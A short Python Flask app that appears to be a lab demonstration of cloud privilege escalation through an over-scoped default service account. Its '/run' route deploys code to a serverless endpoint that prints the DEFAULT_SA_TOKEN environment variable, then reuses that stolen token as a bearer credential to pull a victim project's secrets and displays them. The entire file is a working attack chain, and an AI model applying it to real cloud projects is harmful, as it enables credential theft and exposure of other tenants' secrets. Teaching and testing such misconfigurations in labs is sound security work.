"""Deploy a function that inherits the over-scoped default service account."""
import os

import requests
from flask import Flask, request

app = Flask(__name__)
SERVERLESS = os.environ.get("SERVERLESS_URL", "http://serverless-api:5000")
VICTIM = os.environ.get("VICTIM_URL", "http://victim-project:5000")

HTML = """<h1>Default Service Account Escalation</h1>
<form method="post" action="/run"><button>Run chain</button></form>
<pre>{{out}}</pre>"""


@app.route("/")
def home():
    return HTML.replace("{{out}}", "Ready")


@app.route("/run", methods=["POST"])
def run():
    code = (
        "import os; print(os.environ.get('DEFAULT_SA_TOKEN',''))"
    )
    r = requests.post(f"{SERVERLESS}/deploy", json={"code": code}, timeout=15)
    token = r.json().get("output", "").strip()
    v = requests.get(f"{VICTIM}/api/projects/victim/secrets",
                     headers={"Authorization": f"Bearer {token}"}, timeout=8)
    return HTML.replace("{{out}}", f"function output: {token}\n\n"
                                   f"victim project secrets: {v.text}")


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
